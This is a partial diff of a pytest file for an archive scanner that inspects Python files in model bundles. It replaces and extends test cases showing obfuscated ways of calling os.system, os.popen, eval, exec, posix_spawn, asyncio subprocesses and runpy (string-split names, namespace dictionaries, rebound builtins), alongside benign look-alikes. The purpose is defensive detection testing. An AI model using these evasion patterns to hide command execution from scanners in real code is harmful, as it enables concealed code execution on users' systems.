-        ("namespace = globals()\nnamespace['__builtins__']['eval'] = len\nnamespace['__builtins__']['eval']([])\n"),
-        "lookup = globals().get\nlookup('__builtins__').get('len')([1])\n",
-        "mapping = {'eval': len}\nlookup = mapping.get\nlookup('eval')([])\n",
-        "globals()['__builtins__'].__setitem__('eval', len)\nglobals()['__builtins__']['eval']([])\n",
-        "globals()['__builtins__'].update({'eval': len})\nglobals()['__builtins__']['eval']([])\n",
-        (
-            "replace = globals()['__builtins__'].__setitem__\n"
-            "replace('eval', len)\n"
-            "globals()['__builtins__']['eval']([])\n"
-        ),
-        ("replace = globals()['__builtins__'].update\nreplace({'eval': len})\nglobals()['__builtins__']['eval']([])\n"),
-        "import builtins\nbuiltins.__dict__.update({'eval': len})\nbuiltins.eval([])\n",
-        "import builtins\nreplace = builtins.__dict__.update\nreplace({'eval': len})\nbuiltins.eval([])\n",
-        "globals()['__builtins__']['eval'] = len\nrun = globals()['__builtins__']['eval']\nrun([])\n",
-        ("globals()['__builtins__']['eval'] = len\nrun = globals()['__builtins__']['eval']\nrun.__call__([])\n"),
-        ("globals()['__builtins__'].__setitem__('eval', len)\nrun = globals()['__builtins__']['eval']\nrun([])\n"),
-        (
-            "replace = globals()['__builtins__'].__setitem__\n"
-            "replace('eval', len)\n"
-            "run = globals()['__builtins__']['eval']\n"
-            "run([])\n"
-        ),
-        "globals()['__builtins__'].pop('eval')\nglobals()['__builtins__']['eval']([])\n",
-        "remove = globals()['__builtins__'].pop\nremove('eval')\nglobals()['__builtins__']['eval']([])\n",
-        "del globals()['__builtins__']['eval']\nglobals()['__builtins__']['eval']([])\n",
-        "globals()['__builtins__'].__delitem__('eval')\nglobals()['__builtins__']['eval']([])\n",
-        "globals()['__builtins__'].clear()\nglobals()['__builtins__']['eval']([])\n",
-        "import builtins\nbuiltins.__dict__.clear()\nbuiltins.eval([])\n",
-        "import builtins\ndict.clear(builtins.__dict__)\nbuiltins.eval([])\n",
-    ],
-)
-def test_scan_zip_allows_benign_builtin_shaped_source(tmp_path: Path, source: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
-
-
-@pytest.mark.parametrize(
-    ("source", "dangerous_name"),
-    [
-        (
-            "namespace = globals()\n"
-            "namespace['__builtins__']['eval'] = __builtins__['exec']\n"
-            "namespace['__builtins__']['eval']('pass')\n",
-            "__builtins__.exec",
-        ),
-        (
-            "globals()['__builtins__'].__setitem__('eval', __builtins__['exec'])\n"
-            "globals()['__builtins__']['eval']('pass')\n",
-            "__builtins__.exec",
-        ),
-        (
-            "globals()['__builtins__'].update({'eval': __builtins__['exec']})\n"
-            "globals()['__builtins__']['eval']('pass')\n",
-            "__builtins__.exec",
-        ),
-        (
-            "replace = globals()['__builtins__'].__setitem__\n"
-            "replace('eval', __builtins__['exec'])\n"
-            "globals()['__builtins__']['eval']('pass')\n",
-            "__builtins__.exec",
-        ),
-        (
-            "replace = globals()['__builtins__'].update\n"
-            "replace({'eval': __builtins__['exec']})\n"
-            "globals()['__builtins__']['eval']('pass')\n",
-            "__builtins__.exec",
-        ),
-        (
-            "import builtins\nbuiltins.__dict__.update({'eval': builtins.exec})\nbuiltins.eval('pass')\n",
-            "builtins.exec",
-        ),
-    ],
-)
-def test_scan_zip_reports_dangerous_builtin_reassignment(tmp_path: Path, source: str, dangerous_name: str) -> None:
-    archive_path = tmp_path / "model_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("handler.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    python_checks = [
-        check
-        for check in result.checks
-        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
-    ]
-    assert len(python_checks) == 1
-    assert python_checks[0].rule_code == "S104"
-    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
 
 
 def test_scan_zip_flags_aliased_getattr_helper_dangerous_python_member(tmp_path: Path) -> None:
@@ -859,36 +390,72 @@ def test_scan_zip_flags_concatenated_getattr_name_dangerous_python_member(tmp_pa
     "source",
     [
         "import os\nos.__dict__['sys' + 'tem']('echo hidden')\n",
-        "import os as operating_system\nvars(operating_system)['system']('echo hidden')\n",
+        "import os\nvars(os)['sys' + 'tem']('echo hidden')\n",
         "import os\nos.__dict__.get('sys' + 'tem')('echo hidden')\n",
-        "import os\nvars(os).get('system')('echo hidden')\n",
-        "import os\ngetattr(os, '__dict__')['system']('echo hidden')\n",
-        "import os\ngetattr(os, '__dict__').get('system')('echo hidden')\n",
-        "import os\nos.__dict__.pop('system')('echo hidden')\n",
-        "import os\nos.__dict__.setdefault('system', None)('echo hidden')\n",
-        "import os\nos.__getattribute__('system')('echo hidden')\n",
-        "import os\nobject.__getattribute__(os, 'system')('echo hidden')\n",
-        "import os\ncommands = os.__dict__\ncommands['system']('echo hidden')\n",
-        "import os\ncommands = vars(os)\ncommands.get('system')('echo hidden')\n",
-        "import os\ncommands = getattr(os, '__dict__')\ncommands['system']('echo hidden')\n",
-    ],
-    ids=[
-        "module_dict",
-        "vars_module",
-        "module_dict_get",
-        "vars_get",
-        "getattr_dict",
-        "getattr_dict_get",
-        "module_dict_pop",
-        "module_dict_setdefault",
-        "module_getattribute",
-        "object_getattribute",
-        "assigned_module_dict",
-        "assigned_vars",
-        "assigned_getattr_dict",
+        "import os\nos.__dict__.__getitem__('sys' + 'tem')('echo hidden')\n",
+        "import os\nos.__dict__.get('sys' + 'tem').__call__('echo hidden')\n",
+        "import os\nnamespace = os.__dict__\nnamespace['sys' + 'tem']('echo hidden')\n",
+        "import os\nnamespace = vars(os)\nnamespace.get('sys' + 'tem')('echo hidden')\n",
+        "import os\ngetattr(os, '__dict__')['sys' + 'tem']('echo hidden')\n",
+        "import os\nos.__getattribute__('sys' + 'tem')('echo hidden')\n",
+        "import os\nlookup = os.__getattribute__\nlookup('sys' + 'tem')('echo hidden')\n",
+        "import os\nlookup = os.__getattribute__\nlookup.__call__('sys' + 'tem')('echo hidden')\n",
+        "import os\nlookup = os.__getattribute__.__call__.__call__\nlookup('sys' + 'tem')('echo hidden')\n",
+        "import os\nobject.__getattribute__(os, 'sys' + 'tem')('echo hidden')\n",
+        "import os\nlookup = object.__getattribute__\nlookup(os, 'sys' + 'tem')('echo hidden')\n",
+        "import os\ngetattr(object, '__getattribute__')(os, 'sys' + 'tem')('echo hidden')\n",
+        "import os\nglobals()['os'].system('echo hidden')\n",
+        "import os\nlocals()['os'].system('echo hidden')\n",
+        "import os\nvars()['os'].system('echo hidden')\n",
+        "import os\nnamespace = globals()\nnamespace['runner'] = os.system\nnamespace['runner']('echo hidden')\n",
+        "import os\nglobals().setdefault('runner', os.system)\nrunner('echo hidden')\n",
+        "import os\nnamespace = globals()\nnamespace.setdefault('runner', os.system)\nrunner('echo hidden')\n",
+        "import os\nglobals().__setitem__('runner', os.system)\nrunner('echo hidden')\n",
+        "import os\nnamespace = globals()\nnamespace.__setitem__('runner', os.system)\nrunner('echo hidden')\n",
+        "import os\nnamespace = locals()\nnamespace['runner'] = os.system\nnamespace['runner']('echo hidden')\n",
+        "import os\nnamespace = vars()\nnamespace['runner'] = os.system\nnamespace['runner']('echo hidden')\n",
+        "import os\nclass Install:\n    globals()['runner'] = os.system\nrunner('echo hidden')\n",
+        ("import os\ndef run():\n    globals()['runner'] = os.system\n    globals()['runner']('echo hidden')\nrun()\n"),
+        "import os\ndef run():\n    globals()['runner'] = os.system\n    runner('echo hidden')\nrun()\n",
+        (
+            "import os\nrunner = os.system\nif bool():\n    globals()['runner'] = print\n"
+            "globals()['runner']('echo hidden')\n"
+        ),
+        "import os\nos.__dict__.get('not_present', os.system)('echo hidden')\n",
+        "import os\nname = 'not_present'\nos.__dict__.get(name, os.system)('echo hidden')\n",
+        "import os\nos.__dict__.get('not_present', os.__dict__)['sys' + 'tem']('echo hidden')\n",
+        "import os\nlookup = os.__dict__.get\nlookup('sys' + 'tem')('echo hidden')\n",
+        "import os\nlookup = os.__dict__.__getitem__\nlookup('sys' + 'tem')('echo hidden')\n",
+        "import os\nlookup = os.__dict__.get\nlookup.__call__('sys' + 'tem')('echo hidden')\n",
+        "import os\nlookup = vars(os).get\nlookup('sys' + 'tem')('echo hidden')\n",
+        "import os\nlookup = vars(os).get.__call__\nlookup('sys' + 'tem')('echo hidden')\n",
+        "import os\ndict.__getitem__(os.__dict__, 'sys' + 'tem')('echo hidden')\n",
+        "import os\nlookup = dict.get\nlookup(os.__dict__, 'sys' + 'tem')('echo hidden')\n",
+        "import os\ngetattr(dict, '__getitem__')(os.__dict__, 'sys' + 'tem')('echo hidden')\n",
+        (
+            "import os\nobject.__getattribute__(dict, '__getitem__').__call__("
+            "os.__dict__, 'sys' + 'tem')('echo hidden')\n"
+        ),
+        "import os\nos.__dict__.pop('sys' + 'tem')('echo hidden')\n",
+        "import os\nos.__dict__.setdefault('runner', os.system)('echo hidden')\n",
+        "import os\nos.__dict__.pop('_missing_runner_', os.__dict__)['sys' + 'tem']('echo hidden')\n",
+        "import os\nos.__dict__.setdefault('_missing_runner_', os.__dict__)['sys' + 'tem']('echo hidden')\n",
+        "import os\nlookup = os.__dict__.pop\nlookup('_missing_runner_', os.__dict__)['sys' + 'tem']('echo hidden')\n",
+        "import os\ndict.pop(os.__dict__, '_missing_runner_', os.__dict__)['sys' + 'tem']('echo hidden')\n",
+        "import os\ndict.setdefault(os.__dict__, '_missing_runner_', os.system)('echo hidden')\n",
+        "import os\nglobals()['runner'] = os.system\npopped = globals().pop('runner')\npopped('echo hidden')\n",
+        "import os\nglobals()['runner'] = os.system\nglobals().pop('runner')('echo hidden')\n",
+        "import os\nos.__dict__['runner'] = os.system\nos.runner('echo hidden')\n",
+        "import os\nos.__dict__['runner'] = os.system\npopped = os.__dict__.pop('runner')\npopped('echo hidden')\n",
+        "import os\nnamespace = os.__dict__\nnamespace.__setitem__('runner', os.system)\nos.runner('echo hidden')\n",
+        "import os\n[runner := os.system for _ in (1,)]\nrunner('echo hidden')\n",
+        "import os\n{runner := os.system for _ in (1,)}\nrunner('echo hidden')\n",
+        "import os\nany(runner := os.system for _ in (1,))\nrunner('echo hidden')\n",
+        "import os\nrunner = os.system\nos.__dict__['system'] = print\nrunner('echo hidden')\n",
+        "import os\nos.system = getattr\nos.system(os, 'popen')('echo hidden')\n",
     ],
 )
-def test_scan_zip_flags_static_namespace_dangerous_python_member(tmp_path: Path, source: str) -> None:
+def test_scan_zip_flags_namespace_mapping_dangerous_python_member(tmp_path: Path, source: str) -> None:
     archive_path = tmp_path / "model_bundle.zip"
     with zipfile.ZipFile(archive_path, "w") as archive:
         archive.writestr("handler.py", source)
@@ -904,6 +471,455 @@ def test_scan_zip_flags_static_namespace_dangerous_python_member(tmp_path: Path,
     assert python_checks[0].severity == IssueSeverity.WARNING
     assert python_checks[0].rule_code == "S101"
     assert python_checks[0].details["reason"] == "high-risk calls: os.system"
+
+
+def test_scan_zip_reports_rebound_namespace_callable_target(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = "import os\nos.__dict__['system'] = vars\nos.__dict__['system'](os)['popen']('echo hidden')\n"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S101"
+    assert python_checks[0].details["reason"] == "high-risk calls: os.popen"
+
+
+def test_scan_zip_flags_namespace_bound_os_process_launch(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = (
+        "import os\n"
+        "namespace = os.__dict__\n"
+        "namespace['launch'] = os.posix_spawn\n"
+        "namespace['launch']('/bin/sh', ['sh'], {})\n"
+    )
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S101"
+    assert python_checks[0].details["reason"] == "high-risk calls: os.posix_spawn"
+
+
+@pytest.mark.parametrize(
+    ("source", "dangerous_name"),
+    [
+        (
+            "import asyncio\nasyncio.create_subprocess_exec('/bin/sh', '-c', 'id')\n",
+            "asyncio.create_subprocess_exec",
+        ),
+        (
+            "from asyncio import create_subprocess_shell as run\nrun('id')\n",
+            "asyncio.create_subprocess_shell",
+        ),
+        (
+            "import asyncio.subprocess\nasyncio.subprocess.create_subprocess_shell('id')\n",
+            "asyncio.subprocess.create_subprocess_shell",
+        ),
+        (
+            "import asyncio\nasyncio.create_subprocess_shell = len\nasyncio.create_subprocess_shell([])\n",
+            "asyncio.create_subprocess_shell",
+        ),
+    ],
+)
+def test_scan_zip_flags_asyncio_subprocess_python_member(tmp_path: Path, source: str, dangerous_name: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S103"
+    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
+
+
+@pytest.mark.parametrize(
+    ("source", "dangerous_name"),
+    [
+        ("import runpy\nrunpy.run_module('payload')\n", "runpy.run_module"),
+        ("from runpy import run_path as run\nrun('payload.py')\n", "runpy.run_path"),
+    ],
+)
+def test_scan_zip_flags_runpy_execution_python_member(tmp_path: Path, source: str, dangerous_name: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S108"
+    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
+
+
+def test_scan_zip_preserves_possible_runpy_execution_after_conditional_overwrite(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = "import runpy\nif replace:\n    runpy.run_path = len\nrunpy.run_path('payload.py')\n"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S108"
+    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        "import os\nos.__dict__['getcwd']()\n",
+        "import os\ngetattr(object, '__getattribute__')(os, 'getcwd')()\n",
+        "import os\nnamespace = os.__dict__\nnamespace['runner'] = print\nnamespace['runner']('safe')\n",
+        (
+            "import os\nnamespace = os.__dict__\nnamespace['runner'] = os.system\n"
+            "namespace['runner'] = print\nnamespace['runner']('safe')\n"
+        ),
+        (
+            "import os\nclass Safe:\n    system = print\nnamespace = globals()\n"
+            "namespace['os'] = Safe\nnamespace['os'].system('safe')\n"
+        ),
+        (
+            "import os\nclass Safe:\n    system = print\nnamespace = locals()\n"
+            "namespace['os'] = Safe\nnamespace['os'].system('safe')\n"
+        ),
+        (
+            "import os\nclass Safe:\n    system = print\nnamespace = vars()\n"
+            "namespace['os'] = Safe\nnamespace['os'].system('safe')\n"
+        ),
+        ("import os\nclass Safe:\n    system = print\nclass Replace:\n    globals()['os'] = Safe\nos.system('safe')\n"),
+        (
+            "import os\nclass Safe:\n    system = print\ndef run():\n"
+            "    globals()['os'] = Safe\n    globals()['os'].system('safe')\nrun()\n"
+        ),
+        (
+            "import os\nclass Safe:\n    system = print\ndef run():\n"
+            "    globals()['os'] = Safe\n    os.system('safe')\nrun()\n"
+        ),
+        "import os\nos.__dict__['_safe'] = print\nos.__dict__.get('_safe', os.system)('safe')\n",
+        "import os\nos.__dict__['_safe'] = print\nos.__dict__.pop('_safe', os.system)('safe')\n",
+        "import os\nos.__dict__['_safe'] = print\nos.__dict__.setdefault('_safe', os.system)('safe')\n",
+        "import os\nrunner = print\nglobals().setdefault('runner', os.system)\nrunner('safe')\n",
+        "import os\nglobals()['runner'] = os.system\nglobals().pop('runner')\nrunner('safe')\n",
+        "import os\nos.__dict__['runner'] = os.system\nos.__dict__.pop('runner')\nos.runner('safe')\n",
+        ("import os\nrunner = os.system\nif True:\n    globals()['runner'] = print\nglobals()['runner']('safe')\n"),
+        "import runpy\nrunpy.run_path = len\nrunpy.run_path([])\n",
+    ],
+)
+def test_scan_zip_ignores_benign_namespace_mapping_call(tmp_path: Path, source: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert not any(
+        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_scan_zip_ignores_shadowed_namespace_mapping_helper(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = "import os\nvars = lambda _: {'system': print}\nvars(os)['system']('safe')\n"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert not any(
+        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        "__builtins__['ev' + 'al']('1 + 1')\n",
+        "__builtins__.get('ev' + 'al')('1 + 1')\n",
+        "namespace = __builtins__\nnamespace['ev' + 'al']('1 + 1')\n",
+        "__builtins__.__dict__['ev' + 'al']('1 + 1')\n",
+        "vars(__builtins__)['ev' + 'al']('1 + 1')\n",
+        "__builtins__.eval('1 + 1')\n",
+        "getattr(__builtins__, 'ev' + 'al')('1 + 1')\n",
+        "namespace = __builtins__\nnamespace.eval('1 + 1')\n",
+        "flag = False\nif flag:\n    __builtins__ = {'eval': print}\n__builtins__['ev' + 'al']('1 + 1')\n",
+    ],
+)
+def test_scan_zip_flags_implicit_builtins_mapping_dangerous_python_member(tmp_path: Path, source: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S104"
+    assert python_checks[0].details["reason"] == "high-risk calls: builtins.eval"
+
+
+def test_scan_zip_ignores_shadowed_implicit_builtins_mapping(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = "__builtins__ = {'eval': print}\n__builtins__['eval']('safe')\n"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert not any(
+        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        "globals()['__builtins__']['ev' + 'al']('1 + 1')\n",
+        "globals().get('__builtins__').get('ev' + 'al')('1 + 1')\n",
+        "namespace = globals()['__builtins__']\nnamespace['ev' + 'al']('1 + 1')\n",
+        "globals()['__builtins__'].__dict__['ev' + 'al']('1 + 1')\n",
+        "globals()['__builtins__'].eval('1 + 1')\n",
+        "getattr(globals()['__builtins__'], 'ev' + 'al')('1 + 1')\n",
+        "getattr(globals()['__builtins__'], '__getitem__')('ev' + 'al')('1 + 1')\n",
+        "namespace = globals()['__builtins__']\nnamespace.eval('1 + 1')\n",
+        "namespace = globals()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
+        "locals()['__builtins__']['ev' + 'al']('1 + 1')\n",
+        "vars()['__builtins__']['ev' + 'al']('1 + 1')\n",
+        "namespace = locals()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
+        "namespace = vars()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
+        "lookup = locals().get\nlookup('__builtins__')['ev' + 'al']('1 + 1')\n",
+        "lookup = vars().get\nlookup('__builtins__')['ev' + 'al']('1 + 1')\n",
+        "dict.__getitem__(locals(), '__builtins__')['ev' + 'al']('1 + 1')\n",
+        "if enabled:\n    locals()['__builtins__']['ev' + 'al']('1 + 1')\n",
+        (
+            "namespace = locals()\ndef run():\n    __builtins__ = {'eval': print}\n"
+            "    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun()\n"
+        ),
+        "def run(namespace=locals()):\n    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun()\n",
+        "def run(namespace=vars()):\n    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun()\n",
+        "def run(locals, namespace=locals()):\n    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun(None)\n",
+        "def run(vars, namespace=vars()):\n    namespace['__builtins__']['ev' + 'al']('1 + 1')\nrun(None)\n",
+        "run = lambda namespace=locals(): namespace['__builtins__']['eval']('1 + 1')\nrun()\n",
+        (
+            "import builtins\n"
+            "[locals()['__builtins__']['ev' + 'al']('1 + 1') "
+            "for __builtins__ in (builtins.__dict__,)]\n"
+        ),
+        (
+            "import builtins\n"
+            "[locals()['__builtins__']['ev' + 'al']('1 + 1') "
+            "for (__builtins__,) in ((builtins.__dict__,),)]\n"
+        ),
+        (
+            "import builtins\n"
+            "[locals()['__builtins__']['ev' + 'al']('1 + 1') "
+            "for [__builtins__] in ([builtins.__dict__],)]\n"
+        ),
+        "def run():\n    __builtins__ = {'eval': print}\n    globals()['__builtins__']['eval']('1 + 1')\nrun()\n",
+    ],
+)
+def test_scan_zip_flags_globals_builtins_mapping_dangerous_python_member(tmp_path: Path, source: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S104"
+    assert python_checks[0].details["reason"] == "high-risk calls: builtins.eval"
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        "globals = lambda: {'__builtins__': {'eval': print}}\nglobals()['__builtins__']['eval']('safe')\n",
+        "locals = lambda: {'__builtins__': {'eval': print}}\nlocals()['__builtins__']['eval']('safe')\n",
+        "vars = lambda: {'__builtins__': {'eval': print}}\nvars()['__builtins__']['eval']('safe')\n",
+        "__builtins__ = {'eval': print}\nglobals()['__builtins__']['eval']('safe')\n",
+        "__builtins__ = {'eval': print}\nlocals()['__builtins__']['eval']('safe')\n",
+        "__builtins__ = {'eval': print}\nvars()['__builtins__']['eval']('safe')\n",
+        (
+            "enabled = True\nif enabled:\n    __builtins__ = {'eval': print}\n"
+            "    locals()['__builtins__']['eval']('safe')\n"
+        ),
+        (
+            "enabled = True\nif enabled:\n    __builtins__ = {'eval': print}\n"
+            "    lookup = vars().get\n    lookup('__builtins__')['eval']('safe')\n"
+        ),
+        (
+            "enabled = True\nif enabled:\n    __builtins__ = {'eval': print}\n"
+            "    globals()['__builtins__']['eval']('safe')\n"
+        ),
+        "import os\nlookup = globals().get\nlookup('__builtins__', os.system)('safe')\n",
+        "import os\ndict.get(globals(), '__builtins__', os.__dict__)['system']('safe')\n",
+    ],
+)
+def test_scan_zip_ignores_shadowed_globals_builtins_mapping(tmp_path: Path, source: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert not any(
+        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        "def run():\n    __builtins__ = {'eval': print}\n    locals()['__builtins__']['eval']('safe')\nrun()\n",
+        "def run():\n    __builtins__ = {'eval': print}\n    vars()['__builtins__']['eval']('safe')\nrun()\n",
+        "class Safe:\n    __builtins__ = {'eval': print}\n    locals()['__builtins__']['eval']('safe')\n",
+        (
+            "import builtins\ndef run():\n    __builtins__ = builtins\n"
+            "    locals()['__builtins__']['eval']('safe')\nrun()\n"
+        ),
+        (
+            "import builtins\ndef run():\n    __builtins__ = builtins.__dict__\n"
+            "    locals()['__builtins__'].eval('safe')\nrun()\n"
+        ),
+        (
+            "import builtins\ndef run():\n    __builtins__ = builtins\n"
+            "    vars()['__builtins__']['eval']('safe')\nrun()\n"
+        ),
+        (
+            "import builtins\ndef run():\n    __builtins__ = builtins.__dict__\n"
+            "    vars()['__builtins__'].eval('safe')\nrun()\n"
+        ),
+        "[locals()['__builtins__']['eval']('safe') for __builtins__ in ({'eval': print},)]\n",
+        "[locals()['__builtins__']['eval']('safe') for _ in (1,)]\n",
+        "{locals()['__builtins__']['eval']('safe') for __builtins__ in ({'eval': print},)}\n",
+        "{locals()['__builtins__']['eval']('safe') for _ in (1,)}\n",
+        "{1: locals()['__builtins__']['eval']('safe') for __builtins__ in ({'eval': print},)}\n",
+        "{1: locals()['__builtins__']['eval']('safe') for _ in (1,)}\n",
+        "(locals()['__builtins__']['eval']('safe') for __builtins__ in ({'eval': print},))\n",
+        "(locals()['__builtins__']['eval']('safe') for _ in (1,))\n",
+    ],
+)
+def test_scan_zip_ignores_non_module_local_mappings(tmp_path: Path, source: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert not any(
+        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_scan_zip_ignores_conditionally_bound_local_namespace_without_global_fallback(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = "def run(flag, safe):\n    if flag:\n        os = safe\n    os.system('safe')\n"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert not any(
+        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_scan_zip_ignores_conditionally_bound_local_builtins_without_global_fallback(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = "def run(flag):\n    if flag:\n        __builtins__ = {'eval': print}\n    __builtins__['eval']('safe')\n"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert not any(
+        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        ("import os\nnamespace = os.__dict__\nnamespace['runner'] = os.system\nnamespace['runner']('echo hidden')\n"),
+        (
+            "import os\n"
+            "namespace = os.__dict__\n"
+            "namespace['system'] = print\n"
+            "namespace['system'] = os.system\n"
+            "namespace['system']('echo hidden')\n"
+        ),
+        (
+            "import os\n"
+            "namespace = os.__dict__\n"
+            "namespace['system'] = print\n"
+            "for _ in (1,):\n"
+            "    namespace['system'] = os.system\n"
+            "namespace['system']('echo hidden')\n"
+        ),
+        (
+            "import os\n"
+            "namespace = os.__dict__\n"
+            "namespace['system'] = print\n"
+            "class Rebind:\n"
+            "    namespace['system'] = os.system\n"
+            "namespace['system']('echo hidden')\n"
+        ),
+        "import os\nos.__dict__['system'] = print\nos.system = os.popen\nos.system('echo hidden')\n",
+        "import os\nfor _ in (1,):\n    break\n    os.system = print\nos.system('echo hidden')\n",
+        "import os\nfor _ in (1,):\n    continue\n    os.__dict__['system'] = print\nos.system('echo hidden')\n",
+    ],
+)
+def test_scan_zip_flags_namespace_member_rebound_to_dangerous_callable(tmp_path: Path, source: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert any(
+        check.name == "Python Archive Member Security"
+        and check.status == CheckStatus.FAILED
+        and check.details["reason"] == "high-risk calls: os.system"
+        for check in result.checks
+    )
 
 
 def test_scan_zip_bounds_large_concatenated_getattr_names(tmp_path: Path) -> None:
@@ -1141,47 +1157,6 @@ def test_scan_zip_ignores_benign_python_member(tmp_path: Path) -> None:
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
-@pytest.mark.parametrize(
-    "source",
-    [
-        "import subprocess\nsubprocess.list2cmdline(['input file', '--quiet'])\n",
-        "import subprocess\nsubprocess.CompletedProcess([], 0)\n",
-        "import subprocess\nsubprocess.SubprocessError('failed')\n",
-        "import subprocess\nsubprocess.CalledProcessError(1, ['cmd'])\n",
-        "import subprocess\nsubprocess.TimeoutExpired(['cmd'], 1)\n",
-    ],
-)
